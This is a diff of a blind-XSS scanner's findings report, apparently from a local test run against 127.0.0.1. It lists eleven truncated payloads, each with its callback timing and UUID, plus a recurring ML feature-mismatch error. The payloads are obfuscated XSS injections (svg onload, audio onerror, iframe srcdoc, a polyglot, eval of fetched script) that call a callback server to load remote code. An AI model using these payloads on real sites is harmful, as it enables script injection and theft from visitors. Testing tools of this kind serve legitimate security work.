@@ -4,73 +4,100 @@ BLIND XSS FINDINGS
 
 [1] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.56s (inj→cb)
-    Payload (trunc): " >< iframe srcdoc="< scr< !-- -- >ipt >fetch('http://localhost:5000/c/1641416c-...
+    Delay: 0.35s (inj→cb)
+    Payload (trunc): " >< iframe srcdoc="< scr< !-- -- >ipt >fetch('http://127.0.0.1:5000/c/14b554ef-...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: 1641416c-7c96-454f-a30c-6e1644135ec1
+    User-Agent: python-requests/2.32.4...
+    UUID: 14b554ef-61d4-4403-967d-62fc4c4f9396
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [2] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.48s (inj→cb)
-    Payload (trunc): " >< svg onload=fetch("http://localhost:5000/c/bc4883b7-a187-428f-a0d6-3d82f3cfe...
+    Delay: 0.44s (inj→cb)
+    Payload (trunc): javascr< !-- -- >ipt:"/*'/*`/*-- >< /noscr< !-- -- >ipt >< /title >< /textarea >...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: bc4883b7-a187-428f-a0d6-3d82f3cfe42e
+    User-Agent: python-requests/2.32.4...
+    UUID: 32694f93-e53b-4ec0-9348-d4d262f0c510
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [3] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.45s (inj→cb)
-    Payload (trunc): javascr<!-- -->ipt:"/*'/*`/*--></noscr<!-- -->ipt></title></textarea></style></t...
+    Delay: 0.50s (inj→cb)
+    Payload (trunc): <audio src="x" on<!-- -->error="var a=document.createelement('scr<!-- -->ipt');a...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: 2fb3c014-96e8-4a36-ac1d-4ff40ff4b6fd
+    User-Agent: python-requests/2.32.4...
+    UUID: e4ee2cd3-6ed0-46a6-919e-8857788708e1
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [4] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.42s (inj→cb)
-    Payload (trunc): < audio src="x" on< !-- -- >error="var a=document.createElement('scr< !-- -- >ip...
+    Delay: 0.55s (inj→cb)
+    Payload (trunc): < div onmouseover="var a=document.createelement('script');a.src='http://127.0.0....
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: ddaffe2c-a05c-45d3-a95d-1a5f483cb766
+    User-Agent: python-requests/2.32.4...
+    UUID: 9a77a88e-dda3-458c-9856-8957f4c3a8dd
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [5] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.45s (inj→cb)
-    Payload (trunc): var a=document.createelement("scr<!-- -->ipt");a.src="http://localhost:5000/c/c1...
+    Delay: 0.60s (inj→cb)
+    Payload (trunc): var a=document.createElement("scr< !-- -- >ipt");a.src="http://127.0.0.1:5000/c/...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: c185ad2b-fdcb-460f-847b-94bd5d80673f
+    User-Agent: python-requests/2.32.4...
+    UUID: 91c66ead-643f-4c99-a594-902a2a2a5fb8
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [6] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.54s (inj→cb)
-    Payload (trunc): < scr< !-- -- >ipt >fetch("//localhost:5000/c/69a86191-ad3d-427e-977e-f169b34bd4...
+    Delay: 0.63s (inj→cb)
+    Payload (trunc): < script >fetch("//127.0.0.1:5000/c/1dce0d87-a312-4ab2-9835-52428da132bf").then(...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: 69a86191-ad3d-427e-977e-f169b34bd426
+    User-Agent: python-requests/2.32.4...
+    UUID: 1dce0d87-a312-4ab2-9835-52428da132bf
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [7] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.52s (inj→cb)
-    Payload (trunc): < scr<!-- -->ipt >function b(){{eval(this.responseText)}};a=new XMLHttpRequest()...
+    Delay: 0.45s (inj→cb)
+    Payload (trunc): < scr< !-- -- >ipt >function b(){{eval(this.responseText)}};a=new XMLHttpRequest...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: 9497158e-2302-4473-b2e7-353c317ff1c8
+    User-Agent: python-requests/2.32.4...
+    UUID: ce061a7e-48e2-498b-8636-b7bcf4f25bd7
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
 [8] http://127.0.0.1:8000/comment?text=hello
     Target: text
-    Delay: 0.57s (inj→cb)
-    Payload (trunc): javascr<!-- -->ipt:eval('var a=document.createelement("scr<!-- -->ipt");a.src="h...
+    Delay: 0.45s (inj→cb)
+    Payload (trunc): <body on<!-- -->load="var a=document.createelement('scr<!-- -->ipt');a.src='http...
     Callback IP: 127.0.0.1
-    User-Agent: python-requests/2.32.5...
-    UUID: 086d8364-aec5-4b22-8ce5-731c404a2ad1
+    User-Agent: python-requests/2.32.4...
+    UUID: 91ff0505-c80c-4411-bbb9-e26aa4e2dd3a
+    ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
+--------------------------------------------------------------------------------
+[9] http://127.0.0.1:8000/comment?text=hello
+    Target: text
+    Delay: 0.44s (inj→cb)
+    Payload (trunc): < iframe src="javascr< !-- -- >ipt:var a=document.createElement('scr< !-- -- >ip...
+    Callback IP: 127.0.0.1
+    User-Agent: python-requests/2.32.4...
+    UUID: 22ac0186-e2d4-4272-9971-fda16fe55ff2
+    ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
+--------------------------------------------------------------------------------
+[10] http://127.0.0.1:8000/comment?text=hello
+    Target: text
+    Delay: 0.47s (inj→cb)
+    Payload (trunc): < svg on<!-- -->load="javascr<!-- -->ipt:eval('var a=document.createElement("scr...
+    Callback IP: 127.0.0.1
+    User-Agent: python-requests/2.32.4...
+    UUID: 9b284193-6daa-4cc3-89dd-622bc94bee94
+    ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
+--------------------------------------------------------------------------------
+[11] http://127.0.0.1:8000/comment?text=hello
+    Target: text
+    Delay: 0.04s (inj→cb)
+    Payload (trunc): " >< script src=http://127.0.0.1:5000/c/bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49 >< ...
+    Callback IP: 127.0.0.1
+    User-Agent: python-requests/2.32.4...
+    UUID: bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49
     ML: Error: X has 14 features, but StandardScaler is expecting (score=None, decision=N/A)
 --------------------------------------------------------------------------------
